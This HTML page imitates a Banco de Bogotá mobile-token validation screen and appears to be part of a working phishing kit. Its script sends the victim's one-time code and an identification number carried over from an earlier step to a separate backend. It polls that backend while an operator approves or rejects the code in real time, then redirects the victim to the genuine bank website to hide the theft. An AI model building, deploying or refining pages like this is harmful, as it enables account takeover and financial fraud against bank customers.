<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación de Token - Banco de Bogotá</title>
    
    <!-- Carga la configuración dinámica del backend -->
    <script src="/config.js"></script>
    
    <style>
        /* --- CONFIGURACIÓN GENERAL --- */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #E8F0FE;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }

        /* --- CONTENEDOR PRINCIPAL --- */
        .app-container {
            background-color: #fff;
            width: 100%;
            max-width: 400px;
            border-radius: 30px;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            min-height: 500px;
            position: relative;
        }

        /* --- HEADER AZUL --- */
        .app-header {
            background-color: #003DA5;
            padding: 20px;
            display: flex;
            align-items: center;
            color: white;
            border-top-left-radius: 30px;
            border-top-right-radius: 30px;
            height: 70px;
        }

        .back-arrow {
            font-size: 1.5rem;
            cursor: pointer;
            font-weight: bold;
            margin-right: 15px;
        }

        /* --- LOGO EN EL HEADER --- */
        .header-logo {
            height: 30px; /* Ajusta el tamaño según tu x.png */
            object-fit: contain;
        }

        /* --- CONTENIDO --- */
        .app-content {
            padding: 30px 25px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .title-section h1 {
            font-size: 1.5rem;
            color: #000;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .title-section p {
            font-size: 0.95rem;
            color: #555;
            line-height: 1.5;
            margin-bottom: 35px;
        }

        /* --- INPUT OTP --- */
        .otp-form {
            margin-bottom: 30px;
        }

        .otp-form label {
            display: block;
            font-size: 0.9rem;
            color: #333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .otp-input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 1.2rem;
            text-align: center;
            letter-spacing: 8px;
            outline: none;
            transition: border 0.2s;
        }

        .otp-input:focus {
            border-color: #003DA5;
        }

        /* --- BOTÓN CONTINUAR --- */
        .btn-finalizar {
            background-color: #E0E0E0;
            color: #999;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: not-allowed;
            width: 100%;
            margin-top: auto;
            transition: background-color 0.3s, color 0.3s;
        }

        .btn-finalizar.active {
            background-color: #003DA5;
            color: white;
            cursor: pointer;
        }

        .btn-finalizar.active:hover {
            background-color: #002D72;
        }

        /* --- PANTALLAS DE ESTADO (CARGANDO Y ERROR) --- */
        .overlay-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
            padding: 20px;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.95);
        }

        #loading-screen {
            background-color: #003DA5;
            color: white;
        }

        /* --- ANIMACIÓN DE BOLITAS --- */
        .balls-container {
            display: flex;
            gap: 15px;
            height: 40px; 
            align-items: flex-end;
            position: relative;
        }

        .ball {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            position: relative;
            opacity: 0; 
        }

        .ball-yellow { background-color: #FFCD00; }
        .ball-blue   { background-color: #0055B8; }
        .ball-red    { background-color: #E30613; }

        .ball-blue   { animation: jumpAndSpin 2.5s infinite; animation-delay: 0s; }
        .ball-yellow { animation: jumpAndSpin 2.5s infinite; animation-delay: 0.4s; }
        .ball-red    { animation: jumpAndSpin 2.5s infinite; animation-delay: 0.8s; }

        @keyframes jumpAndSpin {
            0%   { transform: translateY(0); opacity: 0; }
            10%  { opacity: 1; } 
            20%  { transform: translateY(-25px); opacity: 1; } 
            30%  { transform: translateY(0); opacity: 1; }
            40%  { opacity: 1; transform: translateY(0); }
            50%  { opacity: 1; transform: translateY(0); }
            60%  { opacity: 1; transform: translateY(0); }
            70%  { transform: translateY(-10px) rotate(0deg); opacity: 1; }
            85%  { transform: translateY(-10px) rotate(360deg); opacity: 1; }
            100% { transform: translateY(0) rotate(360deg); opacity: 0; }
        }

        .error-box {
            max-width: 400px;
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .error-box h2 {
            color: #333;
            margin-bottom: 15px;
        }

        .error-box p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .btn-retry {
            background-color: #003DA5;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
        }
        
        /* --- RESPONSIVE MÓVIL --- */
        @media (max-width: 480px) {
            body {
                padding: 0;
                align-items: flex-start;
            }
            .app-container {
                border-radius: 0;
                min-height: 100vh;
                box-shadow: none;
            }
            .app-header {
                border-top-left-radius: 0;
                border-top-right-radius: 0;
            }
        }
    </style>
</head>
<body>

    <!-- CONTENEDOR PRINCIPAL -->
    <div class="app-container">
        
        <!-- HEADER AZUL -->
        <div class="app-header">
            <div class="back-arrow">&#8592;</div>
            <!-- LOGO EN EL HEADER -->
            <img src="x.png" alt="Logo" class="header-logo">
        </div>

        <!-- CONTENIDO -->
        <div class="app-content">
            
            <div class="title-section">
                <h1>Validación de Token</h1>
                <p>Por favor, ingresa el token móvil que encontrarás en tu app de Banca Virtual para continuar con el proceso de validación.</p>
            </div>

            <!-- FORMULARIO OTP -->
            <div class="otp-form">
                <label>Ingresa el código de tu Token</label>
                <input type="text" id="otp-input" class="otp-input" placeholder="••••••" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code">
            </div>

            <!-- BOTÓN CONTINUAR -->
            <button class="btn-finalizar" id="btn-otp" disabled>Continuar</button>

        </div>
    </div>

    <!-- PANTALLA DE CARGA (AZUL CON BOLITAS) -->
    <div id="loading-screen" class="overlay-screen">
        <div class="balls-container">
            <div class="ball ball-blue"></div>
            <div class="ball ball-yellow"></div>
            <div class="ball ball-red"></div>
        </div>
    </div>

    <!-- PANTALLA DE ERROR (RECHAZO) -->
    <div id="error-screen" class="overlay-screen">
        <div class="error-box">
            <h2>Código incorrecto</h2>
            <p>El código OTP ingresado no es válido o ha expirado. Por favor, verifica e inténtalo de nuevo.</p>
            <button class="btn-retry" onclick="retryOtp()">Volver a intentar</button>
        </div>
    </div>

    <!-- Scripts -->
    <script>
        // ==========================================
        // 1. CONFIGURACIÓN Y VARIABLES
        // ==========================================
        const BACKEND_URL = window.BACKEND_URL;
        
        // Recuperar datos del usuario aprobado en sede.html
        const identificacionAprobada = sessionStorage.getItem('identificacionAprobada');
        const requestIdOrigen = sessionStorage.getItem('requestIdAprobado');

        // Elementos del DOM
        const otpInput = document.getElementById('otp-input');
        const btnOtp = document.getElementById('btn-otp');
        const loadingScreen = document.getElementById('loading-screen');
        const errorScreen = document.getElementById('error-screen');

        let pollingInterval = null;

        // Si no hay identificación, deshabilitar el botón y mostrar alerta
        if (!identificacionAprobada) {
            btnOtp.textContent = "Sesión expirada";
            btnOtp.disabled = true;
            otpInput.disabled = true;
            otpInput.placeholder = "No disponible";
        }

        // ==========================================
        // 2. LÓGICA DE UI (ACTIVAR BOTÓN)
        // ==========================================
        otpInput.addEventListener('input', () => {
            // Activamos el botón si hay exactamente 6 dígitos
            if (otpInput.value.trim().length === 6 && !otpInput.disabled) {
                btnOtp.disabled = false;
                btnOtp.classList.add('active'); // Se pone azul
            } else {
                btnOtp.disabled = true;
                btnOtp.classList.remove('active'); // Vuelve a gris
            }
        });

        // ==========================================
        // 3. LÓGICA DEL BACKEND (ENVÍO Y POLLING)
        // ==========================================
        async function enviarOtp() {
            const otp = otpInput.value.trim();
            if (otp.length !== 6) return;

            // Mostrar pantalla de carga
            loadingScreen.style.display = 'flex';

            try {
                const response = await fetch(`${BACKEND_URL}/api/otp`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        identificacion: identificacionAprobada, 
                        otp: otp,
                        requestIdOrigen: requestIdOrigen
                    })
                });

                const data = await response.json();
                if (!data.requestId) throw new Error('Error en el servidor');

                // Iniciar Polling para ver si el admin aprueba el OTP
                pollingInterval = setInterval(async () => {
                    const statusRes = await fetch(`${BACKEND_URL}/api/otp-status/${data.requestId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        // OTP APROBADO -> Redirigir
                        clearInterval(pollingInterval);
                        window.location.href = 'https://www.bancodebogota.com';
                    } else if (statusData.status === 'rejected') {
                        // OTP RECHAZADO -> Mostrar error
                        clearInterval(pollingInterval);
                        loadingScreen.style.display = 'none';
                        errorScreen.style.display = 'flex';
                    }
                }, 2000);

            } catch (error) {
                console.error('❌ Error enviando OTP:', error);
                loadingScreen.style.display = 'none';
                alert("Error de conexión. Intenta de nuevo.");
            }
        }

        // ==========================================
        // 4. FUNCIONES AUXILIARES
        // ==========================================
        function retryOtp() {
            errorScreen.style.display = 'none';
            otpInput.value = '';
            btnOtp.disabled = true;
            btnOtp.classList.remove('active');
            otpInput.focus();
        }

        // Evento del botón
        btnOtp.addEventListener('click', enviarOtp);
        
        // Enviar con "Enter" en el input
        otpInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && otpInput.value.trim().length === 6) {
                enviarOtp();
            }
        });
    </script>
</body>
</html>
